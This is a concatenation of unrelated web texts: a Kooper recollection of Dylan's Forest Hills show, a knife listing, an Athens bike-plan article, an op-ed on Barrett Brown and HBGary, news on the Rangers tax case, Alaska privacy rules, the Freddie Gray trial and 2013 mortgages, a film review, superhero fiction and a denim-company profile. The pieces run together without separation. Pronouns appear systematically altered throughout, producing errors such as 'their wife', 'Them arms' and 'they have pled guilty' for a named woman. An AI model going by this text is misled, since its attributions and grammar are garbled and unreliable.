“Forest Hills was a different situation from Newport because we were expecting it,” they recall. “There weren't that many surprises, other than there were people that actually got up onstage and were trying to get at Bob. Some person tripped over the chair I was sitting on when I was playing the keyboards and knocked me over at one point. Like I said, they sang along to ‘Like a Rolling Stone' and then they booed at the end, like they were instructed to boo by the newspaper.”
This time they had good reason to sing along. Kooper says the Newport Folk set was both underrehearsed and “miscast,” in that the band could barely navigate the songs Dylan wanted to play. That, they add, is why the set was over and done with in twenty minutes. The Forest Hills concert gave them ample time to prepare and an opportunity to work with musicians better suited to the material.
“We rehearsed for about a week, and we knew everything, and of course [then] we were in a situation where I was playing with musicians that I knew were the right musicians for the job,” Kooper recalls.
He'd grown up with Brooks and had known Robertson and Helm from before they were the Hawks, the band that played behind rockabilly star Ronnie Hawkins. (Along with Rick Danko, Richard Manuel, and Garth Hudson, Robertson and Helm went on to collaborate with Dylan in the studio and then emerge as stars in their own right as the Band.) “These are all friends of mine,” Kooper says. “It was a much more comfortable situation. They were the right band to play with Bob.” They then notes that the booing subsided by the time Dylan and Co. made their way to the Hollywood Bowl on September 3 — what they deem the best of those pivotal performances.
With the 50th anniversary of the electric summer drawing to a close, Kooper says there's one artist with whom they haven't strolled down memory lane.
“We actually have better things to talk about when we do talk,” they laugh when asked whether they have relived Newport Folk or Forest Hills with Dylan. “I don't think either of us on a day-to-day basis live in the past.” This summer has been a celebration of “something that happened: the electrification of folk music. I just had a month of it, but I know that it's not the way my life normally is. I could easily deal with it. I'm just amazed that it was half a century ago, and that I'm still coherent and can still play and all that.”

Description You know how shotguns are way cool, but are even cooler when they are sawed off shotguns? Have you ever heard it is girth rather than length that matters? Turns out, it is the same with knives. Mick has taken the beast that is known as the XL and gave it a size adjustment while keeping the beefy proportions. So, just like that sawed off shotgun, the Stubby is a mean tool!
So far, the Strider folder series (PT, SnG, SMF, and XL) have all had a similar feel, just in a different size. The Stubby however is a whole new animal! It keeps the beefy rear frame proportions of the XL and the single choil is oversized. The blade is similar to SnG size. The Stubby has a totally different feel. Just locks in your hand and ready for anything!
The Blade: Mick Strider hand ground Nightmare Grind tanto with satin grinds and tumbled flats. Top of the upper swedge has dragon spine grooves. Choil is hand signed M. Strider.

Green “bike boxes” like these near the Tate Center could be coming to other parts of the city as Athens-Clarke County updates its bike master plan.
The mayor-appointed committee charged with revising Athens' bicycle master plan held its second meeting Aug. 29, but Athens cyclists aren't likely to see any changes to bike routes until, at the minimum, a year from now.
Since 2001, only 11 out of 16 routes in the plan have been completed, says Tyler Dewey, a committee member and executive director of BikeAthens. And while those 15 years have passed, bicycle and pedestrian standards and demands have changed, making it necessary to update the BMP. The new master plan is county-wide, Dewey says, instead of only stretching in a 3-mile radius from the UGA Arch, and will provide better access for pedestrians.
When the original BMP was created, “the only thing was simple bike lanes, but now it's a lot easier to look at other examples across the state and the country,” they say. For example, Atlanta has added protected bike lanes with barriers between bike and car lanes, and Roswell has added bike boxes on road lanes for added visibility of cyclists. Some of these changes have already been enacted in Athens' problematic “hot spots,” such as the green-painted bike boxes around the Tate Center on UGA's campus.
Despite those few changes, there is still a long way to go. “In many ways, we are still working on ironing out the details,” Dewey says. After the first two convenings of the new BMP committee, “we're working on, ‘What's our procedure?' and ‘What's our scope?” says Tony Eubanks, committee member and representative from Complete Streets Athens, a group that grew out of efforts to make Prince Avenue more pedestrian-friendly. “The whole planning process will be a year long or longer.”
That length of time is necessary to lay out both short-term and long-term plans to be completed over the next 20 years, says Ken Sherman, the committee chairperson, who represents a nonprofit devoted to building the Firefly Trail along an abandoned railroad between Winterville and Union Point 40 miles south. “We will be looking at how we can tie together Firefly Trail, the [North Oconee River] Greenway, as well as designated bike and pedestrian areas to create a coherent and unified system. The way the areas are designed now [doesn't] necessarily create a viable system,” Sherman says. “We are looking at a big project—this is not something that can happen overnight.”

Together the committee and the county will create a draft of the scope of the project—one that Dewey says will answer to bicycle, pedestrian and transit transportation needs, as well as revisit previously constructed bicycle corridors to make sure they are still appropriate for cyclists and drivers.
Once the draft is finalized, the next step will be to hire a consultant with “specific skills and knowledge in bike and pedestrian transportation, not someone with just general engineering knowledge,” Sherman says. Hiring a consultant should happen within the next two to three months, Dewey says, “and then the fun work begins”—the long-term design and construction of an expanded BMP.
“We are in a state of flux,” Dewey says, because proposed routes that have been on the BMP since 2001 but have yet to be updated, such as Prince Avenue, are now slated to undergo major construction. On the 2001 BMP, if the county went out and measured from curb to curb and did not find extra space for a bicycle lane, “they didn't envision widening lanes,” Dewey says. Now, where major construction has been proposed, one may be able to expect roads to be widened so bicycle lanes can be added, such as on Prince Avenue. However, no plans are close to being finalized yet, and there “may be ways to reconfigure [lanes] without changing curb lines, while also bringing down costs,” says Dewey.
On the other hand, areas proposed to have minor construction could undergo less lane widening, but more repaving and adding signage and striping, such as on Alps Road or Westlake Drive. On Milledge Avenue, too, minor construction may involve repaving, resigning and restriping lanes.
Projects labeled “Planned Bicycle Facility” are ones that will be implemented by other agencies, such as the ACC Leisure Services Department in the case of the Greenway, because they are not necessarily street projects, Dewey says.
The committee will continue to use data from UGA's Traffic Safety Research and Evaluation Group, as BIkeAthens does, to determine those problematic areas and what kind of construction needs to be done. Yet Dewey says there are “not many concrete hot spots, and they are certainly not outside of high-traffic areas.”
The committee expects to continue including community feedback throughout the drafting process. “One of the great opportunities is to expand feedback, to hear back from the community,” Dewey says. “We are hearing about people wanting to walk and bike more if they have the safe space to do so. But someone who is comfortable riding on the road is going to have different concerns than someone who only rides on occasion.”
As public interest and approval increases, “certainly some things can start to happen,” Sherman says. “We hope to have a lot more to share down the line.”
The public is invited to attend the next meeting on Thursday, Sept. 22 at 6 p.m. It will be held at the Planning Department Auditorium at 120 W. Dougherty St.
Why is the talented journalist Barrett Brown in jail – awaiting trial on charges that could keep them there for one hundred years?
A writer for Vanity Fair, the Guardian, and at one time an unofficial spokesperson for the internet pirates known as "Anonymous," Brown apparently stumbled on the murky world of "private" cyber-security firms and their covert relationship with the US government – and is now paying the consequences.
"Anonymous" had its nemesis in Aaron Barr, head honcho over at HBGary, a rather sinister cyber-security outfit that apparently was hoping to get some kind of contract to go after them. Barr foolishly boasted they and their fellow cyber-goons had successfully homed in on the anonymous leadership of "Anonymous." A doubtful proposition the unlikelihood of which was underscored by the hacking of HBGary servers and websites, and the downloading of seventy-thousand emails that revealed chicanery of a particularly dark cast – and, given the Snowden affair, one that is particularly relevant today.
What the Anonymous hack revealed is that HBGary had concocted a plan to go after journalist Glenn Greenwald on account of their defense of Julian Assange and WikiLeaks. The scheme originated when WikiLeaks threatened to download internal and highly incriminating documents detailing the crimes of Bank of America. BofA went to the Justice Department, which suggested they get in touch with the high-powered Washington law firm of Hunton & Williams.
The law firm was apparently soliciting proposals, and Barr's Myrmidons suggested targeting Greenwald because, they averred, "without the support of people like Glenn, WikiLeaks would fold." It was a smear campaign birthed in the dark, with corporate and governmental officials collaborating in an effort to bring down Assange – and anyone who dared defend them – utilizing "disinformation" and "creating messages around actions to sabotage or discredit" both Assange and Greenwald. Ignoring the old adage "know your enemy," HBGary personnel argued in emails that Greenwald, "if pushed" would certainly "choose professional preservation over cause."
I can just hear Glenn chortling over that one!
Among other projects exposed by Anonymous was a plan, submitted to the US Air Force, to create a "persona management" system – fake identities that would create a cybernetic Astroturf army in social media. Exactly what top Obama advisor Cass Sunstein had in mind when they proposed the US government "cognitively infiltrate" allegedly subversive "conspiracy-minded" groups over the Internet. Now isn't that a coincidence?
The materials unearthed by the Anonymous hack were so voluminous that Brown solicited the help of other journalists by setting up a wiki page, ProjectPM. As a recent piece in The Nation puts it, "Under Brown's leadership the initiative began to slowly untangle a web of connections between the US government, corporations, lobbyists and a shadowy group of private military and information consultants." Together, this coven – including not only HBGary but also Palantir Technologies, Berico Technologies, and something called Endgame Systems – came up with a scheme involving the planting of false documents, targeting friends, families, and associates, and the Sunstein-like "cognitive infiltration" of opponent organizations, all directed at WikiLeaks, Assange, and Greenwald. Unions and liberal advocacy groups were also on the hit list. They called themselves "Team Themis," after the Greek goddess of divine justice.
That wasn't the end of it. Soon thereafter a group of hackers liberated many thousands of emails from the account of Stratfor, a company that specializes in geopolitical commentary for big corporate clients. As The Nation puts it, "the contents of the Stratfor leak were even more outrageous than those of the HBGary hack. They included discussion of opportunities for renditions and assassinations." Brown posted a link to the Stratfor data dump on ProjectPM. – an act which later showed up on their charge sheet.
It's when Brown began investigating "Endgame Systems" that the (hammer) of the State came down on them hard.
Endgame is in the business of what appears to be hacking, providing information on weak spots in computer software that could be used to compromise systems. According to Business Week:
"Endgame executives will bring up maps of airports, parliament buildings, and corporate offices. The executives then create a list of the computers running inside the facilities, including what software the computers run, and a menu of attacks that could work against those particular systems."
In other words, they do just what the NSA does – and, perhaps, at their direction. This was cutting too close to home for the US Justice Department – which, you'll recall, had been the catalyst for the creation of "Team Themis" in the first place. Brown was homing in on a dark alliance of government and corporate entities tasked with carrying out activities that were, at best, borderline illegal.
When FBI agents burst into Brown's mother's house they were clearly after their sources. As is common in authoritarian countries, they didn't limit their attack to just one person, but also went after their mother, who was charged with hiding the "evidence" of Brown's alleged "crime" in their house. (She says they had no idea the laptop was in their house: they have pled guilty, and faces up to a year in jail).
This was too much for Brown, who snapped – and posted a semi-coherent rant on YouTube that prosecutors say contained direct threats to the FBI agents involved in the case. The FBI's revenge is a charge sheet that could land Brown in jail for the rest of their life.
The other day in the course of congressional hearings, the House's leading authoritarian, Rep. Mike Rogers (R-Oceania), speculated that journalists who report on the NSA's depredations against our privacy might be subject to the same legal ramifications as Edward Snowden. The idea is to intimidate journalists into not covering certain subjects – and, by the way, to lay the foundations for the de facto abolition of the First Amendment. That should make Cass Sunstein – who proposes a "New Deal" for the First Amendment that would "guide" news coverage in a pro-government direction – to no end. This is how the neocons and their "progressive" allies in Obama-land collaborate in creating the conditions for a tyranny masquerading as a liberal "democracy."
As long as Barrett Brown is in jail, claims that the United States is a "free country" – indeed, the "beacon of freedom" in the world – are just so much horseshit. And while we're on the subject, who did get that government contract for "persona management," and how many of Twitter's most obnoxious trolls are their demonic spawn? How many of the alleged pundits and anonymous Twitter trolls ceaselessly smearing Greenwald and Snowden are in the pay of these government contractors who are so close to the Justice Department and other US government agencies?
This isn't just about Barrett Brown, although their fate is important: this is about preserving what's left of our liberties. Calls by some members of Congress for the Justice Department to conduct an investigation of Team Themis have gone unanswered, but why doesn't some enterprising member of congress initiate hearings so we can have a public investigation of this case? I hear there are a few alleged libertarians in Congress: c'mon guys, let's get a move on.

Image copyright SNS Group Image caption The case concerns the use of Employee Benefit Trusts
Rangers' liquidators have been granted leave to appeal to the UK Supreme Court over a ruling that the use of Employee Benefit Trusts (EBTs) broke tax rules.
Rangers used the scheme from 2001 until 2010 to give millions of pounds of tax-free loans to players and other staff.
HM Revenue and Customs (HMRC) lost two tribunals before judges agreed these were salary payments subject to tax.
The judges have now said liquidators BDO can appeal, as the ruling has implications for future cases.
Rangers' use of EBTs and the subsequent appeals by HMRC have become known as the "big tax case".
HMRC lost its initial appeal that tax was due on EBTs at a First Tier Tax Tribunal on 2012.
The decision was upheld at an Upper Tier Tribunal in 2014.
HMRC's third appeal, made last year, was upheld in a decision issued by Lord Carloway, sitting with Lord Menzies and Lord Drummond Young.
The judges ruled that if income was derived from an employee's services, in their capacity as an employee, it was an emolument or earnings and "thus assessable to income tax".
The same judges have now allowed an appeal to the UK Supreme Cout.
Lord Carloway said: "The court is of the view that there is an arguable point in law of public interest which should allow the appeal to the UK Supreme Court to proceed.
"There are significant issues in this case which may apply to other similar situations."
The decision was in relation to Murray Group companies, including the liquidated company RFC 2012 - formerly The Rangers Football Club PLC.
It has no impact on the current owners at Ibrox.
Consumer privacy advocates are concerned after the U.S. Senate on Thursday passed a resolution that will roll back privacy rules the Federal Communications Commission approved last year, but the two largest Alaska-based telecommunications companies say their customers won't be affected.
A win for the telecommunications industry, the measure would undo rules not yet in effect that would have provided "heightened protection for sensitive consumer information" and require internet service providers to get customer approval to use and share their data with companies such as advertisers.
That data include web browsing history, financial and health information, geolocation information and more.
The largest Alaska telecom, GCI, doesn't sell customer data and has no plans to do so in the future, said spokesperson Heather Handyside.
"Privacy is very important to Alaskans and we respect that our customers place their trust in us, and we take that very seriously," they said. "We don't have a position on this, but we don't sell our customers' data."
Alaska Communications also said it does not sell or have plans to sell its customer data to third parties.
"It's unlikely that our company will be engaging in that in the future," said Leonard Steinberg, a senior vice president at the company. Asked if Alaska Communications supports tossing the rules approved in October, they said, "I think we are in favor of it."
Alaska Communications spokesperson Hannah Blankenship said in an email that "while we don't have intentions to change our longstanding privacy policy, if we made changes, they would be reflected in the policy, available on our website."
They didn't speculate on how the company might inform consumers if such a situation ever came up, but said Alaska Communications is "committed to being transparent with our customers and would act accordingly."
The Alaska Telephone Association, an industry group that represents small phone and broadband providers as well as GCI and Alaska Communications, welcomed the vote.
"We're constantly struggling with pretty burdensome regulations that are really developed for the AT&T's and Googles of the world, and most of us up here are small providers," said ATA executive director Christine O'Connor. "It's costly for us to comply. … I'm very comfortable with having these rules removed."
All Republican lawmakers who cast a vote Thursday voted in favor of the resolution, including Alaska Sens. Lisa Murkowski and Dan Sullivan. Republicans have said the rules put unfair regulations on telecom companies "but not on web companies such as Facebook and Google that also provide access to online content," The New York Times reported. No Democrats voted yes.
The American Civil Liberties Union on Thursday voiced disapproval of the resolution.
"It is extremely disappointing that the Senate voted today to sacrifice the privacy rights of Americans in the interest of protecting the profits of major internet companies, including Comcast, AT&T, and Verizon," said ACLU legislative counsel Neema Singh Guliani in a statement. "The resolution would undo privacy rules that ensure consumers control how their most sensitive information is used."
Sullivan's spokesperson, Mike Anderson, said in an email that the senator "believes that all aspects of the Internet should be required to protect consumer information and governed by a consistent privacy framework so that consumers know how their information is being protected at all times," and, "this resolution allows the government agencies to work together on a privacy framework that strikes the proper balance between privacy and innovation."
Murkowski "believes that regulators and Congress need to work together on a holistic solution that creates a level playing field when it comes to consumer privacy, not the confusion created by multiple regimes," said spokesperson Karina Petersen in an email.
“You are not too small. No one is ever too small to offer help.”

Fast forward—
On the way home the school bus passed by one of the houses that Austin had saved. All things considered, it looked pretty good. There was only minimal damage to the exterior.
Austin hadn't always gotten to houses in time. He'd thought they were being clever, listening to dispatches from the fire department and driving to the scene on their sister's moped, but they hadn't accomplished very much. Sometimes they were able to get there before everything was over, but that didn't mean that the house would be saved. After someone died, Austin realized that they simply had to do better.
The next day they went to the chief of the local station, demonstrated what they could do, and offered their services. They made no mention that there were others like him. Chief Walker agreed to keep Austin's identity secret until they were older, and from the next day forward Austin did their homework at the fire station and stayed on call there.
They still haven't forgotten the sight of the body, though, and while he's been lucky enough to not see any other deaths, it's important to Austin that they not get cocky. Every night they google burned-down houses and deaths by fire to keep them fresh in their mind. The house that they saw was okay, but only because he's staying vigilant. There's another reminder that they carry with him, but it isn't as important to them as the price that others pay when help doesn't arrive quickly enough.
The bus stops, and its doors swing open. They step down and passes by a kid who's been waiting at the stop. Out of sight, out of mind, though, at least until the other kid says their name. Austin turns around, wondering if they should recognize the kid. He's Creole, Austin guesses, and shorter than Austin but not necessarily younger. Their hair is a kind of ash brown, and their clothes are baggy, almost hanging off their rail-thin frame.
“I'm like you,” the kid says, and for a moment Austin wonders if it's some sort of race thing, which for the life of them they can't puzzle out because, like, what is the point of sitting on a bench and waiting to say that, but the kid evidently realizes that they were being overly vague and it's all that Austin can do to not stare: “I can see how people are going to die.”
As if it's not enough that Austin's got one-half of the package from Stephen King's Firestarter, now there's a kid (with a Canadian accent, notices some part of Austin's mind) who may as well have stepped out of The Dead Zone.
“How did you find me?”
“I realized that you were working with the Baton Rouge Fire Department. There were some little things, like realizing in hindsight that only the earliest news articles mentioned a moped, but I figured it out after I marked down all of the sightings and realized that they mapped to one of the fire stations. If you could listen to the dispatches from one station then you could listen to any of them, so that couldn't be the reason why, which meant that either you lived next door to the station and it was coincidence, or you were working with them.”
Austin fishes their cell out of their pocket and sends a text to the fire chief. As much as they don't want to admit it, this probably takes precedence. Dead Zone tracked them down, all the way from freaking Canada. and if weird things come in threes then he's going to be meeting a spider-clown or a gunslinger or something next week, and they should at least try to be prepared.
“Do you want to talk at my place?” they ask,
Dead Zone nods and takes a place beside Austin. “What's with the gloves? I mean, it's not exactly cold right now.”
Austin glances at their gloves, then pulls one off to reveal a mess of bandages. “I can control fire, shrink it or even make it bigger, but I have to touch it and pardon the blasphemy but God forgot to add ‘fire immunity' to the package.”
To their credit, Dead Zone is able to suppress the snicker that was clearly rising up in him, and offer up instead a sympathetic, “That sucks. Anyway, my name's Simon Martin. I'd shake your hand but I don't think you'd be interested in that. So,” they start as they resume walking, “you think that God is the one that did this?”
Austin shrugs. “It's as good of a guess as any, isn't it? Really, it could be a giant turtle for all we know, or pure blind chance.”
Simon shakes their head. “It wasn't chance. Maybe we were, but the event itself couldn't have been.”
“No, I guess not.” Finally at their door, Austin pauses long enough to fish for the key ring and unlock it. They hold the door open long enough for Simon to walk through, then follows. “My parents won't be home for a few hours. I don't know when Abigail will be back.”
Simon sits down at the kitchen table. “Do you still drive the moped to the fire station?”
“No. I take the bus.” Sometimes they cross paths with their sister as she's coming home from classes at OLOL, but more often not. Austin slides out a chair for himself, opposite Simon. “It's been a while since I've had quiet like this. The station is anything but.”
Simon doesn't respond. They look a little lost in thought. When they do speak up, it's on another topic entirely. “How far is your range? I mean, if you're touching the flames, how big can they be before you can't affect the far end?”
“I don't know. I've only worked on houses, and those are big, but they're not, you know, huge fields or something. I haven't had to handle something like that yet, thank God, and I'm not about to create a huge fire just to test things out.” Simon's power comes to mind. “Is there something in particular that I should prepare for?”
“No, just asking in gen…” Simon stops himself. “Well, okay, the world might be ending,” they say, and Austin's glad that they aren't eating anything because they might have choked to death just then if they had been. “Now, you are the only other person with superpowers that I've met so far, but you're still the only person I've met with firepower potential. I can tell how somebody might die, but that doesn't do me much good in a fight.”
“Did anyone tell you about this, or do you see it when you do your Dead Zone thing?”
“Kind of both. I got told about some of it by this old lady when I looked into their future. They knew who I was and, I don't know if they were going to die no matter what or if they sacrificed themselves to send a message, but I saw a nuclear bomb or something go off in Pittsburgh, Pennsylvania. They said that it was 2016, but I don't know exactly when that was. There was snow on the ground, but it could have been January or December.”
This is definitely out of The Dead Zone. “How are the two of us supposed to stop a nuclear war?”
“Don't forget, there are ninety-eight more of us. I think this is why we're here, anyway. But, um.” Simon looks hesitant, like they really doesn't want to say what's going to come next, but knows that it really has to be said. “Nuclear war is probably the least of our problems. It might not even be for the reasons that you're thinking of. In Toronto I saw people twisted into these grotesque, I call them ‘body trees,' these things, like something had come along and shaped them like clay. I saw whole forests, sometimes. It stopped once I got far enough out of Toronto, and I've seen people die in plenty of other ways, but nobody's been kind enough to die in front of the morning newspaper so I don't know exactly what's happening or how long we have.”
Austin is about to suggest that they use them to get a look into the future, but just then there's a knock on the door. “It's probably Bridgett or another one of Abigail's friends. I'll be just a minute.” When they open the door, though, it's no one that he's ever seen before–none of them are. There are three people standing on their porch.
“I'm Mary Rucker,” says one, a woman with thin eyebrows. “This is my partner, Bert Blank,” they say, gesturing to the broad-shouldered man standing beside them Both of them are dressed in business casual. “And this is Hannah Johnson,” Rucker says of the sharp-boned girl standing between them, who looks like they might be Austin's age. Them arms are folded, one finger on their right hand tapping against their left arm as they scowl, ever so slightly, in Rucker's direction. “We're with the CIA, and we'd like to have a conversation with you.”

The Spirit: Action adventure. Starring Gabriel Macht, Eva Mendes, Samuel L. Jackson and Scarlett Johansson. Directed by Frank Miller. (PG-13. 103 minutes. At Bay Area theaters.)
Frank Miller will survive this disaster.
Miller's distinction as one of the all-time best comic book writers is strong enough to withstand their role in making one of the worst comic book movies ever. After all, Sidney Poitier directed Bill Cosby in "Ghost Dad," and even that cinematic atrocity couldn't undo their work in "Lilies of the Field."
But just because writer-director Miller will walk away from "The Spirit," based on Will Eisner's groundbreaking comic strip, with their reputation more or less intact doesn't mean that you will. There will be relationships that end because of this film, which ties with "Wild Wild West" as the worst first-date movie of all time. Even in these lean economic times, I would guess that somewhere between 25 and 35 percent of each audience will walk out before the movie is over. Throwing your $10.25 down a storm drain is a better idea; at least that way you won't feel the added self-loathing of wasting more than an hour and a half of your life watching Eva Mendes in the worst acting job of their career.
Yes, worse than "Ghost Rider." And yet their performance doesn't even rank in the top 150 problems with this film, which features a nearly indestructible crime fighter named the Spirit and their confusing and boring adventures. Because of the space limitations of the newspaper medium, here's a random sampling:
Problem No. 148: The Spirit's costume. You have never seen a more poorly accessorized superhero. They appear to be wearing black skater shoes with white soles and a thin red tie like ones that Spandau Ballet might have worn to the "Do They Know It's Christmas" sessions. As for their cheap-looking black mask, you could make a better one in five minutes with a Raiders jersey, a pair of scissors and some rubber cement.
Problem No. 111: Samuel L. Jackson. Jackson plays the Octopus, a really cool villain from the Spirit comic. In the strip, readers never see more than their gloves, making them a mysterious and scary guy. In the movie, he's simply Samuel L. Jackson. You know, the "Snakes on a Plane"/ "Lakeview Terrace"/And-you-will-know-my-name-is-the-Lord-when-I-lay-my-vengeance-upon-thee persona that is quickly becoming a joke. It's time to rent "Jungle Fever" again to remember why we used to like this guy.
Problem No. 110: The dialogue. Here's an actual quote from the Octopus in the movie: "There's nothing I like better than kicking your ass ... except maybe eggs." What does that even mean?
Problem No. 75: The misogynist themes. Hey, I appreciate a sexist plot turn as much as the next guy. Bring on the "Porky's" remake. But does every woman in this movie have to pine hopelessly after our hero? And do they have to treat them all like dirt? Miller's next film better be a Gloria Steinem biopic.
Problem No. 34: The laptops and cell phones. Every part of this movie's dialogue and look seems to be an attempt to re-create the 1940s - at least until someone's Nokia cell phone starts ringing. Was wireless coverage really that good during the Truman administration?
Problem No. 5: The PG-13 rating. After you've watched the stylized cinematic carnage and mayhem in "Sin City" and "300," both excellent movies made from Miller graphic novels, the action in this movie seems extremely bloodless and limp. True, it's modeled after a comic strip that appeared in family newspapers. But they included a copy machine in the 1940s; would it seem so strange to have some R-rated violence as well?
All of this is coming from someone who thinks Miller is a genius. The Dark Knight Returns is one of the three or four best comic books of all time. And yet Miller's track record for writing movies was already suspect (he also wrote "Robocop 2" and "Robocop 3").
Nearly every move they make in "The Spirit" is misguided. Like the way seemingly simple things are ruined, including the audio effects, which sound as if they were borrowed from the local Wacky Morning Zoo radio program. Or the way that Jackson wears a hat like Jed Clampett from "The Beverly Hillbillies." Or the way that every scene looks as if it was done in one take ...
Right about now you might be getting kind of curious. Could it really be that bad? Has a film finally been made that's worse than "Highlander II: The Quickening"?
Give Miller some credit. They didn't make the worst movie of all time. But that's about the best thing that can be said for "The Spirit."
-- Advisory: This film contains brief nudity, sexual situations, violence and a buttocks-on-the-copy machine sequence that should not be repeated during your holiday work party.
BALTIMORE — The acquittal Monday of a police officer charged in the arrest of Freddie Gray, the black man who suffered a fatal spinal cord injury while in police custody last year, immediately renewed questions of whether any of the six police officers charged in the case would be convicted in connection with their death.
Officer Edward M. Nero's acquittal on four charges for their role in the opening moments of Mr. Gray's arrest was a second blow to the prosecution's sweeping case, announced as Baltimore was still seething after the unrest following Mr. Gray's death in April 2015. The first trial, against Officer William G. Porter, ended in a hung jury in December, touching off legal maneuvers that brought proceedings against the officers to a temporary halt.
But legal experts said Judge Barry G. Williams's finding was a narrow one that does not forestall the possibility of convictions against other officers charged in the case. They said Judge Williams's ruling turned not on a wholesale rejection of prosecutors' broad legal theory, but rather on their determination that Officer Nero, 30, was a bit player in Mr. Gray's arrest.
Judge Williams, who ruled on the case after the officer opted to forgo a jury trial, said in their verdict that there were other officers who played — or who could have reasonably been expected to play — a bigger role in the encounter. And while that is no guarantee that other officers will be found guilty, it is those officers who will stand trial in the coming months.
Mortgage news of the early bust years was filled with drama, doom and gloom, but at last, in 2013, the news is getting better. Delinquencies are down, rates are up and guidelines are getting tighter again as lenders and government agencies struggle to find a balance between customer safety and profitability. There was a lot of good news for homeowners and would-be homeowners, too – our 2013 news round-up is full of good news for practically everybody.
Underwater mortgages are beginning to dry out
By late 2009, about 26 percent of all American home mortgages were underwater – that is, the homeowner owed more than their property was worth – according to numbers guru CoreLogic. This year, we saw significant decreases in this number, largely due to gains in home prices. At end end of the first quarter, 19.7 percent of homeowners were still underwater, but the end second quarter showed significant improvement with only 14.5 percent of homeowners with more loan than value.
CoreLogic generally releases third quarter numbers in January, but all signs point to the continued contraction of this important metric – this is great news for both home buyers and sellers across the country. homeowners' collective seven percent gain in home equity during the second quarter means that home buyers will have a better supply of ready-to-move-into homes to choose from now that home sellers are finally able to get out from under their boom-priced mortgages and get into different homes.
Credit reporting distinguishing foreclosures from short sales
It was treated like a footnote in the news, but this little gem didn't escape our watchful eyes. Back in August, Fannie Mae announced they would be changing their credit reporting to clearly distinguish between short sales and foreclosures on consumer credit reports. It may not sound like much of an improvement, but foreclosures can prevent a consumer from buying a home for up to seven years, where short sales only hurt borrowers for up to three.
In the world of computerized underwriting, this subtle difference has been penalizing homeowners who worked with their banks in order to secure a solid buyer as harshly as those who simply walked away from their homes and sent their banks “jingle mail.” Short sellers can sometime prove to their banks that they did the right thing, but it can require a lot of effort and a bank willing to manually underwrite loans. This small change provides separate reporting codes for short sales and foreclosures, opening homeownership back up to short sellers who are ready to buy again. After all, in the housing market, the more buyers, the healthier the climate.
Representative Mel Watt (D-N.C.) appointed Head of the Federal Housing Finance Agency
Nominated for the post in May, Representative Mel Watt of North Carolina was finally confirmed to the head of the Federal Housing Finance Agency (FHFA) in December after months of partisan bickering. Representative Watt, a long-time champion of the middle class and opponent of predatory lending and other deceptive mortgage practices, is now charged with the big job of leading and regulating Fannie Mae and Freddie Mac.
Their opponents say they lack the experience to do the job, despite many years as a member of the House Financial Services Committee. Others, including the Senate Banking Committee Chairman, Tim Johnson (D-S.D.), believe their appointment will provide more security to our still uncertain housing recovery. Only time will tell how this change in leadership will affect the mortgage industry.
The Consumer Financial Protection Bureau in the news
The Consumer Financial Protection Bureau (CFPB) was born out of the smoldering remains of the real estate meltdown of the mid to late 2000s, as a part of the Dodd-Frank Wall Street Reform and Consumer Protection Act of 2010. This independent agency is responsible for regulating customer protection when it comes to financial products and services, like mortgages, in the United States. Since its inception, the CFPB has been making headlines, but in 2013, the agency made waves repeatedly with their Ability-to-Repay and Qualified Mortgage rules, which take effect January 10, 2014.
The Ability-to-Repay rule, in essence, requires that lenders ensure that all borrowers can repay their mortgages, which seems simple enough. There are eight specific criteria that a lender must verify on each borrower, but all are items that mainstream lenders have always checked for typical borrowers like income, complete debt history, debt to income ratios and credit history. The Qualified Mortgage rule allows for flexibility in lending to borrowers who may have less than ideal histories or incomplete documentation, provided the loan isn't predatory in nature – limits on total points and fees, payments calculated on the highest expected payment during the first five years and terms not exceeding 30 years are just a few criteria these loans must meet in order to be considered “qualified” and therefore entitled to the same protection as a loan that meets all the Ability-to-Repay criteria.
Although this move generated lots of debate, the intent is to prevent the mortgage industry from once again creating a glut of exotic mortgage products that are destined to fail. Limiting how widespread these special loans can get should help to protect us from another landslide of defaults as the mortgage and real estate industries continue to struggle back onto their feet. Because of these new rules, federal agencies and borrowers' right to litigate if lenders behave inappropriately will be extended to three years for any current loans and indefinitely in response to foreclosure. To compliment this move, the CFPB has also released modified mortgage disclosure forms that are easier for customers to understand.
Big changes for troubled borrowers from FHA
Every few years there are big changes to the Federal Housing Administration's loan programs that end up affecting only a handful of borrowers. This year is no different – the temporary legislation allowing the FHA to extend up to $729,750 in high-cost areas has expired, dropping the national standard FHA loan limit back to $625,500. This change won't affect many buyers, but another key change announced this summer may – FHA has decided to go easy on borrowers who have lost their homes or had payment problems due to economic hardship.
Borrowers who filed for bankruptcy or lost their homes during the recession won't be automatically rejected for an FHA loan if at least a year has passed since their “economic event,” but the burden of proof remains on the borrower. Not only must they complete housing counseling, to qualify for a new FHA loan the potential borrower must prove their economic situation has changed for the better. Despite the hurdles, this move should bring new buyers back to the real estate market.
Fannie Mae eliminates 97 percent loans
An announcement in October sent home buyers scrambling to secure the last of Fannie Mae's 97 percent loans because as of November 16, 2013, these loans would no longer be available. Other changes, like dropping 40 year mortgages and interest-only loans and making qualifying for adjustable-rate mortgages much tougher, were included in the bad news. For many borrowers, though, Fannie Mae's still-available 95 percent loans will continue to make financial sense over similar FHA programs with lower down payments.
Along with these modifications to their loan programs for borrowers, both Fannie Mae and Freddie Mac announced a fee increase for lenders starting in March 2014. The rate hike isn't substantial, only about 1/10 of a percent, but should help private capital compete better against the lending giants while offsetting the loss of fees from now-discontinued loan products.
2013: Preparing for a new mortgage landscape
The top mortgage news of 2013 wasn't earth-shattering, but much of what has happened has laid the groundwork for a change in the landscape of mortgage lending going forward. Positive moves toward stronger protection for consumers, who rely on mortgage experts to explain the process for them, as well as new blood at the FHFA and a strengthening real estate market point to an end to the economic doldrums we've been experiencing. A plan is coming together in the industry, and that plan should ensure a better future once the real estate market is back in full form.
David and Clare Hieatt created the denim company Hiut two and a half years ago, as a mission to get hundreds of people their jobs back.
Cardigan, a pretty market town in west Wales, was once home to Dewhirst, the biggest jeans factory in Britain. Dewhirst employed 400 locals. They produced 35,000 pairs of jeans a week, supplying denim across the country, including to M&S. Then, in 2001, Dewhirst decided to outsource production to Morocco and the factory closed. Cardigan suffered immeasurably; overnight, 10% of locals were on the dole.
Hiut was set up by David, a former advertising copywriter, and their wife Clare in 2011. The couple used to run the ethical fashion brand Howies. Hiut now sells exclusively raw denim which, in part, means they don't wash the jeans. “In the old factory,” explains David, “they used to wash denim in the river. The waters ran blue which, of course, wasn't good, for the wild salmon and seals especially.”
